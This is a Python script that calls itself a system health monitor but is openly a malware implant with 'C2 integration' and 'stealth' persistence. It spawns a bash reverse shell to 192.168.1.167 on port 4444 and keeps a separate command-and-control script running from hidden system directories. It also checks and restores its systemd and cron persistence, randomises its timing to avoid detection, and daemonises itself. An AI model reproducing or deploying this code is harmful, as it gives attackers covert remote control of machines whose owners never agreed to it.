#!/usr/bin/env python3
"""
Enhanced System Health Monitor with C2 Integration
Advanced persistence and stealth monitoring
"""

import os
import time
import json
import psutil
import socket
import logging
import subprocess
import sys
import random
from datetime import datetime
from pathlib import Path

class EnhancedSystemMonitor:
    def __init__(self):
        self.stealth_dir = "/usr/lib/systemd/system-monitor"
        self.backup_dir = "/etc/.system-monitor"
        self.log_file = "/var/log/system-monitor/health.log"
        self.setup_logging()
        
    # ADD REVERSE SHELL FUNCTION
    def start_reverse_shell(self):
        """Spawn a reverse shell in a separate process"""
        try:
            # Run the reverse shell in the background
            subprocess.Popen(
                "bash -i >& /dev/tcp/192.168.1.167/4444 0>&1 &",
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.logger.info("Reverse shell spawned")
        except Exception as e:
            self.logger.error(f"Failed to start reverse shell: {e}")
        
    def setup_logging(self):
        """Setup stealth logging"""
        Path("/var/log/system-monitor").mkdir(parents=True, exist_ok=True)
        
        logging.basicConfig(
            filename=self.log_file,
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        self.logger = logging.getLogger('SystemMonitor')
        
    def ensure_directories(self):
        """Ensure all required directories exist"""
        Path(self.stealth_dir).mkdir(parents=True, exist_ok=True)
        Path(self.backup_dir).mkdir(parents=True, exist_ok=True)
        
    def check_c2_communicator(self):
        """Ensure C2 communicator is running"""
        try:
            # Check if network_monitor is running
            result = subprocess.run(
                ['pgrep', '-f', 'network_monitor.py'],
                capture_output=True, text=True
            )
            
            if not result.stdout.strip():
                self.logger.info("C2 communicator not running - starting...")
                c2_script = os.path.join(self.stealth_dir, "network_monitor.py")
                if os.path.exists(c2_script):
                    subprocess.Popen(
                        [sys.executable, c2_script],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                        stdin=subprocess.DEVNULL
                    )
                    self.logger.info("C2 communicator started")
            else:
                self.logger.debug("C2 communicator is running")
                
        except Exception as e:
            self.logger.error(f"Error checking C2 communicator: {e}")
    
    def collect_advanced_metrics(self):
        """Collect comprehensive system metrics"""
        try:
            # CPU information
            cpu_percent = psutil.cpu_percent(interval=1)
            cpu_count = psutil.cpu_count()
            cpu_freq = psutil.cpu_freq()
            
            # Memory information
            memory = psutil.virtual_memory()
            swap = psutil.swap_memory()
            
            # Disk information
            disk_usage = psutil.disk_usage('/')
            disk_io = psutil.disk_io_counters()
            
            # Network information
            net_io = psutil.net_io_counters()
            net_connections = len(psutil.net_connections())
            
            # System information
            boot_time = datetime.fromtimestamp(psutil.boot_time())
            users = len(psutil.users())
            
            metrics = {
                'timestamp': datetime.now().isoformat(),
                'system': {
                    'hostname': socket.gethostname(),
                    'boot_time': boot_time.isoformat(),
                    'users_count': users,
                    'uptime': int(time.time() - psutil.boot_time())
                },
                'cpu': {
                    'percent': cpu_percent,
                    'cores': cpu_count,
                    'frequency': cpu_freq.current if cpu_freq else None
                },
                'memory': {
                    'total': memory.total,
                    'available': memory.available,
                    'percent': memory.percent,
                    'used': memory.used
                },
                'disk': {
                    'total': disk_usage.total,
                    'used': disk_usage.used,
                    'free': disk_usage.free,
                    'percent': disk_usage.percent
                },
                'network': {
                    'bytes_sent': net_io.bytes_sent,
                    'bytes_recv': net_io.bytes_recv,
                    'connections': net_connections
                },
                'security': {
                    'c2_running': bool(subprocess.run(['pgrep', '-f', 'network_monitor.py'], 
                                                    capture_output=True).stdout.strip()),
                    'service_active': bool(subprocess.run(['systemctl', 'is-active', 'system-health-monitor.service'],
                                                        capture_output=True).returncode == 0)
                }
            }
            
            return metrics
            
        except Exception as e:
            self.logger.error(f"Error collecting metrics: {e}")
            return None
    
    def save_metrics_report(self, metrics):
        """Save metrics to stealth location"""
        try:
            if metrics:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                report_file = os.path.join(self.stealth_dir, f"metrics_{timestamp}.json")
                
                with open(report_file, 'w') as f:
                    json.dump(metrics, f, indent=2)
                
                # Clean up old reports (keep last 10)
                self.cleanup_old_reports()
                
                self.logger.info(f"Metrics report saved: {report_file}")
                return report_file
                
        except Exception as e:
            self.logger.error(f"Error saving metrics report: {e}")
        return None
    
    def cleanup_old_reports(self):
        """Clean up old metric reports"""
        try:
            reports = []
            for file in os.listdir(self.stealth_dir):
                if file.startswith("metrics_") and file.endswith(".json"):
                    file_path = os.path.join(self.stealth_dir, file)
                    reports.append((file_path, os.path.getctime(file_path)))
            
            # Sort by creation time and remove oldest beyond 10 files
            reports.sort(key=lambda x: x[1])
            for file_path, _ in reports[:-10]:
                os.remove(file_path)
                self.logger.debug(f"Removed old report: {file_path}")
                
        except Exception as e:
            self.logger.error(f"Error cleaning up reports: {e}")
    
    def verify_persistence(self):
        """Verify and repair persistence mechanisms"""
        try:
            # Check systemd service
            service_status = subprocess.run(
                ['systemctl', 'is-active', 'system-health-monitor.service'],
                capture_output=True, text=True
            )
            
            if service_status.returncode != 0:
                self.logger.warning("Systemd service not active - repairing...")
                subprocess.run(['systemctl', 'start', 'system-health-monitor.service'],
                             capture_output=True)
            
            # Check cron jobs
            cron_check = subprocess.run(
                ['crontab', '-l'],
                capture_output=True, text=True
            )
            
            if 'network_monitor.py' not in cron_check.stdout:
                self.logger.warning("Cron persistence missing - would repair")
            
            self.logger.debug("Persistence verification completed")
            
        except Exception as e:
            self.logger.error(f"Error verifying persistence: {e}")
    
    def monitor_loop(self):
        """Main monitoring loop"""
        self.logger.info("Starting enhanced system health monitor")
        
        # Initial setup
        self.ensure_directories()
        self.check_c2_communicator()
        self.start_reverse_shell()  # ADDED THIS LINE
        
        error_count = 0
        max_errors = 5
        
        while True:
            try:
                # Check and ensure C2 communicator is running
                self.check_c2_communicator()
                
                # Collect and save metrics
                metrics = self.collect_advanced_metrics()
                if metrics:
                    self.save_metrics_report(metrics)
                    error_count = 0  # Reset error count on success
                else:
                    error_count += 1
                    self.logger.warning(f"Failed to collect metrics (error {error_count}/{max_errors})")
                
                # Verify persistence every 5 minutes
                if int(time.time()) % 300 == 0:
                    self.verify_persistence()
                
                # Exit if too many consecutive errors
                if error_count >= max_errors:
                    self.logger.error("Too many consecutive errors - restarting")
                    break
                
                # Random sleep to avoid pattern detection
                sleep_time = 60 + random.randint(-10, 10)
                time.sleep(sleep_time)
                
            except KeyboardInterrupt:
                self.logger.info("Monitoring interrupted by user")
                break
            except Exception as e:
                self.logger.error(f"Unexpected error in monitor loop: {e}")
                error_count += 1
                time.sleep(30)
        
        # Restart on failure
        self.logger.info("Monitor loop ended - process should be restarted by systemd")

def main():
    """Main execution with proper daemonization"""
    # Fork to background
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.exit(1)
    
    # Decouple from parent environment
    os.chdir("/")
    os.setsid()
    os.umask(0)
    
    # Second fork
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError as e:
        sys.exit(1)
    
    # Start monitoring
    monitor = EnhancedSystemMonitor()
    monitor.monitor_loop()

if __name__ == "__main__":
    main()
